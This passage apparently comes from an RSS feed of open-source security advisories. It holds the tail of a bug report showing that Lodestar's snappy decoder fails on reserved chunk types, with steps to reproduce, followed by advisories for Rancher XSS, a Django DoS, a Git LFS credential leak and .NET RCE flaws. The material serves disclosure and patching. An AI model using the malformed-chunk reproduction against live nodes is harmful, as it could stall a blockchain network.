Similar code can be found in golang implementation - https:&#x2F;&#x2F;github.com&#x2F;golang&#x2F;snappy&#x2F;blob&#x2F;master&#x2F;decode.go#L221

```
func (r *Reader) fill() error {
	...
	if chunkType &amp;lt;= 0x7f {
			&#x2F;&#x2F; Section 4.5. Reserved unskippable chunks (chunk types 0x02-0x7f).
			r.err = ErrUnsupported
			return r.err
		}
		&#x2F;&#x2F; Section 4.4 Padding (chunk type 0xfe).
		&#x2F;&#x2F; Section 4.6. Reserved skippable chunks (chunk types 0x80-0xfd).
		if !r.readFull(r.buf[:chunkLen], false) {
			return r.err
		}
```

Now let&#x27;s see how lodestar handles such chunks https:&#x2F;&#x2F;github.com&#x2F;ChainSafe&#x2F;lodestar&#x2F;blob&#x2F;unstable&#x2F;packages&#x2F;reqresp&#x2F;src&#x2F;encodingStrategies&#x2F;sszSnappy&#x2F;snappyFrames&#x2F;uncompress.ts#L17

```
uncompress(chunk: Uint8ArrayList): Uint8ArrayList | null {
    this.buffer.append(chunk);
    const result = new Uint8ArrayList();
    while (this.buffer.length &amp;gt; 0) {
      if (this.buffer.length &amp;lt; 4) break;

      const type = getChunkType(this.buffer.get(0));
      const frameSize = getFrameSize(this.buffer, 1);

      if (this.buffer.length - 4 &amp;lt; frameSize) {
        break;
      }

      const data = this.buffer.subarray(4, 4 + frameSize);
      this.buffer.consume(4 + frameSize);

      if (!this.state.foundIdentifier &amp;&amp; type !== ChunkType.IDENTIFIER) {
        throw &quot;malformed input: must begin with an identifier&quot;;
      }

      if (type === ChunkType.IDENTIFIER) {
        if (!Buffer.prototype.equals.call(data, IDENTIFIER)) {
          throw &quot;malformed input: bad identifier&quot;;
        }
        this.state.foundIdentifier = true;
        continue;
      }

      if (type === ChunkType.COMPRESSED) {
        result.append(uncompress(data.subarray(4)));
      }
      if (type === ChunkType.UNCOMPRESSED) {
        result.append(data.subarray(4));
      }
    }
    if (result.length === 0) {
      return null;
    }
    return result;
  }

 function getChunkType(value: number): ChunkType {
  switch (value) {
    case ChunkType.IDENTIFIER:
      return ChunkType.IDENTIFIER;
    case ChunkType.COMPRESSED:
      return ChunkType.COMPRESSED;
    case ChunkType.UNCOMPRESSED:
      return ChunkType.UNCOMPRESSED;
    case ChunkType.PADDING:
      return ChunkType.PADDING;
    default:
      throw new Error(&quot;Unsupported snappy chunk type&quot;);
  }
```

As you can see, lodestar does not recognize such chunks.

If it sees such chunk, function getChunkType() throws an exception and decoding fails.

### Impact Details

Faulty nodes may trigger chain stall by sending messages which lodestar fails to parse, while other clients will be able to handle.

### Proof of Concept

How to reproduce:

1. get archive (via provided [gist link](https:&#x2F;&#x2F;gist.github.com&#x2F;gln7&#x2F;bdde7f4e0bdf9d47bf810a015796867a)), decode and unpack it:
```
$ base64 -d poc.txt &amp;gt; poc.tgz
$ tar zxf poc.tgz
```

2. run dec1.go to verify that our snappy file decompressed successfully
```
$ go run dec1.go

reading 1.snappy...
read 124 bytes, err &amp;lt;nil&amp;gt;
```

3. run dec1.mjs to verify that lodestar fails to decode such file
```
checking chunk type=255
checking chunk type=1
got uncompressed chunk..
checking chunk type=129
file:&#x2F;&#x2F;&#x2F;..&#x2F;poc&#x2F;dec1.mjs:74
            throw new Error(&quot;Unsupported snappy chunk type&quot;);
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2v2w-8v8c-wcm9: 8.9 | <b>Rancher UI has Stored Cross-site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2v2w-8v8c-wcm9</link>
                    <pubDate>2025-01-14T22:03:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2v2w-8v8c-wcm9'>https://osv.dev/vulnerability/GHSA-2v2w-8v8c-wcm9</a><br>
                            <b>Published:</b> 2025-01-14T22:03:33Z<br>
                            <b>Severity:</b> 8.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/rancher/rancher/security/advisories/GHSA-2v2w-8v8c-wcm9'>https://github.com/rancher/rancher/security/advisories/GHSA-2v2w-8v8c-wcm9</a></li><li>- <a target='_blank' href='https://github.com/rancher/rancher'>https://github.com/rancher/rancher</a></li></ul><br>
                            <b>Details:</b> <b>Rancher UI has Stored Cross-site Scripting vulnerability</b><br>### Impact
A vulnerability has been identified within Rancher UI that allows a malicious actor to perform a Stored XSS attack through the cluster description field.

Please consult the associated  [MITRE ATT&amp;CK - Technique - Drive-by Compromise](https:&#x2F;&#x2F;attack.mitre.org&#x2F;techniques&#x2F;T1189&#x2F;) for further information about this category of attack.

### Patches
The fix introduces new changes in the directives responsible for sanitizing HTML code before rendering. 

We replaced the `v-tooltip` directive with the `v-clean-tooltip` directive.

Patched versions include releases `2.9.4` and `2.10.0`.

### Workarounds
There are no workarounds for this issue. Users are recommended to upgrade, as soon as possible, to a version of &#x2F;Rancher Manager which contains the fixes.

### Credits
This issue was identified and reported by Bhavin Makwana from Workday’s Cyber Defence Team.

### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https:&#x2F;&#x2F;github.com&#x2F;rancher&#x2F;rancher&#x2F;security&#x2F;policy) for security related inquiries.
- Open an issue in the [Rancher](https:&#x2F;&#x2F;github.com&#x2F;rancher&#x2F;rancher&#x2F;issues&#x2F;new&#x2F;choose) repository.
- Verify with our [support matrix](https:&#x2F;&#x2F;www.suse.com&#x2F;suse-rancher&#x2F;support-matrix&#x2F;all-supported-versions&#x2F;) and [product support lifecycle](https:&#x2F;&#x2F;www.suse.com&#x2F;lifecycle&#x2F;).

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qcgg-j2x8-h9g8: 5.8 | <b>Django has a potential denial-of-service vulnerability in IPv6 validation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qcgg-j2x8-h9g8</link>
                    <pubDate>2025-01-14T21:31:47Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qcgg-j2x8-h9g8'>https://osv.dev/vulnerability/GHSA-qcgg-j2x8-h9g8</a><br>
                            <b>Published:</b> 2025-01-14T21:31:47Z<br>
                            <b>Severity:</b> 5.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/django/django/commit/ca2be7724e1244a4cb723de40a070f873c6e94bf'>https://github.com/django/django/commit/ca2be7724e1244a4cb723de40a070f873c6e94bf</a></li><li>- <a target='_blank' href='https://docs.djangoproject.com/en/dev/releases/security'>https://docs.djangoproject.com/en/dev/releases/security</a></li><li>- <a target='_blank' href='https://github.com/django/django'>https://github.com/django/django</a></li><li>- <a target='_blank' href='https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-1.yaml'>https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-1.yaml</a></li><li>- <a target='_blank' href='https://groups.google.com/g/django-announce'>https://groups.google.com/g/django-announce</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2025/01/msg00024.html'>https://lists.debian.org/debian-lts-announce/2025/01/msg00024.html</a></li><li>- <a target='_blank' href='https://www.djangoproject.com/weblog/2025/jan/14/security-releases'>https://www.djangoproject.com/weblog/2025/jan/14/security-releases</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2025/01/14/2'>http://www.openwall.com/lists/oss-security/2025/01/14/2</a></li></ul><br>
                            <b>Details:</b> <b>Django has a potential denial-of-service vulnerability in IPv6 validation</b><br>An issue was discovered in Django 5.1 before 5.1.5, 5.0 before 5.0.11, and 4.2 before 4.2.18. Lack of upper-bound limit enforcement in strings passed when performing IPv6 validation could lead to a potential denial-of-service attack. The undocumented and private functions `clean_ipv6_address` and `is_valid_ipv6_address` are vulnerable, as is the `django.forms.GenericIPAddressField` form field. (The django.db.models.GenericIPAddressField model field is not affected.)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-q6r2-x2cc-vrp7: 8.5 | <b>Git LFS permits exfiltration of credentials via crafted HTTP URLs</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-q6r2-x2cc-vrp7</link>
                    <pubDate>2025-01-14T21:20:42Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-q6r2-x2cc-vrp7'>https://osv.dev/vulnerability/GHSA-q6r2-x2cc-vrp7</a><br>
                            <b>Published:</b> 2025-01-14T21:20:42Z<br>
                            <b>Severity:</b> 8.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/git-lfs/git-lfs/security/advisories/GHSA-q6r2-x2cc-vrp7'>https://github.com/git-lfs/git-lfs/security/advisories/GHSA-q6r2-x2cc-vrp7</a></li><li>- <a target='_blank' href='https://github.com/git-lfs/git-lfs/commit/0345b6f816e611d050c0df67b61f0022916a1c90'>https://github.com/git-lfs/git-lfs/commit/0345b6f816e611d050c0df67b61f0022916a1c90</a></li><li>- <a target='_blank' href='https://github.com/git-lfs/git-lfs'>https://github.com/git-lfs/git-lfs</a></li><li>- <a target='_blank' href='https://github.com/git-lfs/git-lfs/releases/tag/v3.6.1'>https://github.com/git-lfs/git-lfs/releases/tag/v3.6.1</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2025/01/msg00022.html'>https://lists.debian.org/debian-lts-announce/2025/01/msg00022.html</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3390'>https://pkg.go.dev/vuln/GO-2025-3390</a></li></ul><br>
                            <b>Details:</b> <b>Git LFS permits exfiltration of credentials via crafted HTTP URLs</b><br>### Impact

When Git LFS requests credentials from Git for a remote host, it passes portions of the host&#x27;s URL to the `git-credential(1)` command without checking for embedded line-ending control characters, and then sends any credentials it receives back from the Git credential helper to the remote host.  By inserting URL-encoded control characters such as line feed (LF) or carriage return (CR) characters into the URL, an attacker may be able to retrieve a user&#x27;s Git credentials.

### Patches

This problem exists in all previous versions and is patched in v3.6.1.  All users should upgrade to v3.6.1.

### Workarounds

There are no workarounds known at this time.

### References

* https:&#x2F;&#x2F;github.com&#x2F;git-lfs&#x2F;git-lfs&#x2F;security&#x2F;advisories&#x2F;GHSA-q6r2-x2cc-vrp7
* https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2024-53263
* https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2024-53263
* https:&#x2F;&#x2F;github.com&#x2F;git-lfs&#x2F;git-lfs&#x2F;releases&#x2F;tag&#x2F;v3.6.1
* [git-lfs&#x2F;git-lfs@0345b6f816](https:&#x2F;&#x2F;github.com&#x2F;git-lfs&#x2F;git-lfs&#x2F;commit&#x2F;0345b6f816e611d050c0df67b61f0022916a1c90)

### For more information

If you have any questions or comments about this advisory:
* For general questions, start a discussion in the Git LFS [discussion forum](https:&#x2F;&#x2F;github.com&#x2F;git-lfs&#x2F;git-lfs&#x2F;discussions).
* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https:&#x2F;&#x2F;github.com&#x2F;git-lfs&#x2F;git-lfs&#x2F;blob&#x2F;main&#x2F;SECURITY.md).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-gjf6-3w4p-7xfh: 8.8 | <b>Microsoft Security Advisory CVE-2025-21176 | .NET and Visual Studio Remote Code Execution Vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-gjf6-3w4p-7xfh</link>
                    <pubDate>2025-01-14T19:46:14Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-gjf6-3w4p-7xfh'>https://osv.dev/vulnerability/GHSA-gjf6-3w4p-7xfh</a><br>
                            <b>Published:</b> 2025-01-14T19:46:14Z<br>
                            <b>Severity:</b> 8.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/dotnet/runtime/security/advisories/GHSA-gjf6-3w4p-7xfh'>https://github.com/dotnet/runtime/security/advisories/GHSA-gjf6-3w4p-7xfh</a></li><li>- <a target='_blank' href='https://github.com/dotnet/runtime'>https://github.com/dotnet/runtime</a></li><li>- <a target='_blank' href='https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21176'>https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21176</a></li></ul><br>
                            <b>Details:</b> <b>Microsoft Security Advisory CVE-2025-21176 | .NET and Visual Studio Remote Code Execution Vulnerability</b><br># Microsoft Security Advisory CVE-2025-21176 | .NET and Visual Studio Remote Code Execution Vulnerability

## &amp;lt;a name=&quot;executive-summary&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Executive summary

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 8.0 and .NET 9.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

An attacker could exploit this vulnerability by loading a specially crafted file in Visual Studio.

## Announcement

Announcement for this issue can be found at https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;runtime&#x2F;issues&#x2F;111425

## &amp;lt;a name=&quot;mitigation-factors&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Mitigation factors

Microsoft has not identified any mitigating factors for this vulnerability.

## &amp;lt;a name=&quot;affected-software&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Affected software

* Any .NET 8.0 application running on .NET 8.0.11 or earlier.
* Any .NET 9.0 application running on .NET 9.0.0 or earlier.

## &amp;lt;a name=&quot;affected-packages&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Affected Packages
The vulnerability affects any Microsoft .NET project if it uses any of affected packages versions listed below

### &amp;lt;a name=&quot;.NET 9&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;.NET 9
Package name | Affected version | Patched version
------------ | ---------------- | -------------------------
[Microsoft.NetCore.App.Runtime.linux-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm64)           | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm)     | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm64) | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-x64)     | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-x64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.osx-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-arm64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.osx-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-x64)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x64)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-x86](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x86)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1

### &amp;lt;a name=&quot;.NET 8&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;.NET 8
Package name | Affected version | Patched version
------------ | ---------------- | -------------------------
[Microsoft.NetCore.App.Runtime.linux-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm64)           | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-musl-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm)     | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-musl-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm64) | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-musl-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-x64)     | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-x64)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.osx-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-arm64)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.osx-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-x64)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm64)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x64)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-x86](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x86)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12

## Advisory FAQ

### &amp;lt;a name=&quot;how-affected&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;How do I know if I am affected?

If you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you&#x27;re exposed to the vulnerability.

### &amp;lt;a name=&quot;how-fix&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;How do I fix the issue?

1. To fix the issue please install the latest version of .NET 9.0 or .NET 8.0, as appropriate. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.
2. If your application references the vulnerable package, update the package reference to the patched version.

* You can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;

```
.NET SDK:
 Version:           9.0.100
 Commit:            59db016f11
 Workload version:  9.0.100-manifests.3068a692
 MSBuild version:   17.12.7+5b8665660

Runtime Environment:
 OS Name:     Mac OS X
 OS Version:  15.2
 OS Platform: Darwin
 RID:         osx-arm64
 Base Path:   &#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;sdk&#x2F;9.0.100&#x2F;

.NET workloads installed:
There are no installed workloads to display.
Configured to use loose manifests when installing new manifests.

Host:
  Version:      9.0.0
  Architecture: arm64
  Commit:       9d5a6a9aa4

.NET SDKs installed:
  9.0.100 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;sdk]

.NET runtimes installed:
  Microsoft.AspNetCore.App 9.0.0 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;shared&#x2F;Microsoft.AspNetCore.App]
  Microsoft.NETCore.App 9.0.0 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;shared&#x2F;Microsoft.NETCore.App]

Other architectures found:
  x64   [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet]
    registered at [&#x2F;etc&#x2F;dotnet&#x2F;install_location_x64]

Environment variables:
  Not set

global.json file:
  Not found

Learn more:
  https:&#x2F;&#x2F;aka.ms&#x2F;dotnet&#x2F;info

Download .NET:
  https:&#x2F;&#x2F;aka.ms&#x2F;dotnet&#x2F;download
```

* If you&#x27;re using .NET 9.0, you should download and install .NET 9.0  Runtime or .NET 9.0.100 SDK (for Visual Studio 2022 v17.12 latest Preview) from https:&#x2F;&#x2F;dotnet.microsoft.com&#x2F;download&#x2F;dotnet-core&#x2F;9.0.

Once you have installed the updated runtime or SDK, restart your apps for the update to take effect.

Additionally, if you&#x27;ve deployed [self-contained applications](https:&#x2F;&#x2F;docs.microsoft.com&#x2F;dotnet&#x2F;core&#x2F;deploying&#x2F;#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.

## Other Information

### Reporting Security Issues

If you have found a potential security issue in .NET 9.0 or .NET 8.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core &amp; .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at &amp;lt;https:&#x2F;&#x2F;aka.ms&#x2F;corebounty&amp;gt;.

### Support

You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;runtime. The Announcements repo (https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.

### Disclaimer

The information provided in this advisory is provided &quot;as is&quot; without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

### External Links

[CVE-2025-21176]( https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2025-21176)

### Revisions

V1.0 (January 14, 2024): Advisory published.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-jjcv-wr2g-4rv4: 7.5 | <b>Microsoft Security Advisory CVE-2025-21172 | .NET and Visual Studio Remote Code Execution Vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-jjcv-wr2g-4rv4</link>
                    <pubDate>2025-01-14T19:44:47Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-jjcv-wr2g-4rv4'>https://osv.dev/vulnerability/GHSA-jjcv-wr2g-4rv4</a><br>
                            <b>Published:</b> 2025-01-14T19:44:47Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/dotnet/runtime/security/advisories/GHSA-jjcv-wr2g-4rv4'>https://github.com/dotnet/runtime/security/advisories/GHSA-jjcv-wr2g-4rv4</a></li><li>- <a target='_blank' href='https://github.com/dotnet/runtime'>https://github.com/dotnet/runtime</a></li><li>- <a target='_blank' href='https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21172'>https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21172</a></li></ul><br>
                            <b>Details:</b> <b>Microsoft Security Advisory CVE-2025-21172 | .NET and Visual Studio Remote Code Execution Vulnerability</b><br># Microsoft Security Advisory CVE-2025-21172 | .NET and Visual Studio Remote Code Execution Vulnerability

## &amp;lt;a name=&quot;executive-summary&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Executive summary

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 8.0 and .NET 9.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

An attacker could exploit this vulnerability by loading a specially crafted file in Visual Studio.

## Announcement

Announcement for this issue can be found at https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;runtime&#x2F;issues&#x2F;111424.

## &amp;lt;a name=&quot;mitigation-factors&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Mitigation factors

Microsoft has not identified any mitigating factors for this vulnerability.

## &amp;lt;a name=&quot;affected-software&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Affected software

* Any .NET 8.0 application running on .NET 8.0.11 or earlier.
* Any .NET 9.0 application running on .NET 9.0.0 or earlier.

## &amp;lt;a name=&quot;affected-packages&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Affected Packages
The vulnerability affects any Microsoft .NET project if it uses any of affected packages versions listed below

### &amp;lt;a name=&quot;.NET 9&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;.NET 9
Package name | Affected version | Patched version
------------ | ---------------- | -------------------------
[Microsoft.NetCore.App.Runtime.linux-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm64)           | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm)     | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm64) | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-x64)     | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-x64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.osx-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-arm64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.osx-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-x64)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x64)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-x86](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x86)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1

